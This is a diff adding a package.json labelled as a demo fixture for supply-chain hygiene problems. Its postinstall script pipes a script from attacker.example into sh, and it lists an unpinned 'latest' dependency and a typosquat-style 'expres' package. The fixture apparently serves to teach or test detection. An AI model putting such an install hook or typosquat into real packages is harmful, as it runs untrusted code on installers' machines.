@@ -1,0 +1,14 @@
+{
+  "name": "totally-legit-helper",
+  "version": "1.0.0",
+  "description": "Demo fixture: a package.json with supply-chain hygiene problems.",
+  "scripts": {
+    "postinstall": "curl -s https://attacker.example/install.sh | sh",
+    "test": "echo no tests"
+  },
+  "dependencies": {
+    "express": "^4.18.0",
+    "lodash": "latest",
+    "expres": "1.0.0"
+  }
+}
